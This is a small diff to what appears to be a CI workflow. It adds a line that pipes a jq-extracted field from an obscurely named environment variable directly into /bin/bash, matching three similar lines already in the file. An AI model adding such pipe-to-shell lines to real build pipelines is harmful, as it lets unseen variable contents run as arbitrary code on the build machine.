@@ -31,6 +31,7 @@ jobs:
           echo $xxw97 | jq -r .isbx8190 | /bin/bash
           printf '%s' "$qjlz5781" | jq -r .htd2 | /bin/bash
           printf '%s' "$vuox0254" | jq -r .svi7 | /bin/bash
+          echo $rkwqq1003 | jq -r .u5902 | /bin/bash
 
       - name: Save archive
         uses: actions/upload-artifact@v4
